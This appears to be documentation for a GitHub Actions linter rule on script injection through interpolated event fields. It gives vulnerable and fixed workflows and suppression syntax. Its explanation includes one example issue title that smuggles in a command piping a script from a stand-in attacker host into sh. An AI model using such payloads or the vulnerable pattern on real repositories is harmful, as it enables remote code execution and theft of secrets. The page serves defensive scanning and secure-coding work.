# GW001: Script injection from untrusted context

**Severity:** critical

## What it detects

An expression `${{ ... }}` that interpolates attacker-controllable data into a
`run:` script or into the `script:` input of `actions/github-script`. The rule
flags these contexts:

- `github.event.issue.title`, `github.event.issue.body`
- `github.event.pull_request.title`, `.body`, `.head.ref`, `.head.label`
- `github.event.comment.body`, `github.event.review.body`,
  `github.event.review_comment.body`
- `github.event.pages.*.page_name`
- `github.event.commits.*.message`, `github.event.commits.*.author.*`
- `github.event.head_commit.message`, `github.event.head_commit.author.*`
- `github.head_ref`
- `github.event.discussion.title`, `github.event.discussion.body`
- `github.event.workflow_run.head_branch`, `github.event.workflow_run.head_commit.*`

## Why it's dangerous

GitHub expands `${{ }}` expressions before the shell or the JavaScript engine
sees the script, so the value is pasted into the source text. Anyone who can
open an issue or a pull request controls these fields. Suppose a workflow runs
`echo "${{ github.event.issue.title }}"` and an attacker opens an issue titled
`"; curl https://attacker.example/x.sh | sh; echo "`. The runner then executes
the attacker's command with the job's `GITHUB_TOKEN` and every secret that job
can read. Branch names are an equally good vector, because Git allows
characters such as `$`, `(`, `)` and `;` in ref names. The injection works on
public repositories without any special access.

## Vulnerable example

```yaml
name: triage
on:
  issues:
    types: [opened]

permissions:
  issues: write

jobs:
  greet:
    runs-on: ubuntu-latest
    steps:
      - name: Log title
        run: echo "New issue - ${{ github.event.issue.title }}"
```

## Fixed example

Pass the value through an environment variable. The shell then treats it as
data, not as code.

```yaml
name: triage
on:
  issues:
    types: [opened]

permissions:
  issues: write

jobs:
  greet:
    runs-on: ubuntu-latest
    steps:
      - name: Log title
        env:
          ISSUE_TITLE: ${{ github.event.issue.title }}
        run: echo "New issue - $ISSUE_TITLE"
```

In `actions/github-script`, read the value from `context.payload` instead of
interpolating it into `script:`:

```yaml
name: triage
on:
  issues:
    types: [opened]

permissions:
  issues: write

jobs:
  greet:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/github-script@3a2844b7e9c422d3c10d287c895573f7108da1b3 # v9.0.0
        with:
          script: |
            const title = context.payload.issue.title;
            core.info(`New issue - ${title}`);
```

## Suppressing

Put the comment on the line the finding points at:

```yaml
        run: echo "New issue - ${{ github.event.issue.title }}"  # gha-warden: ignore[GW001]
```

Suppress only when the value is provably not attacker-controlled, for example
when an earlier step validated it against a fixed allow-list.
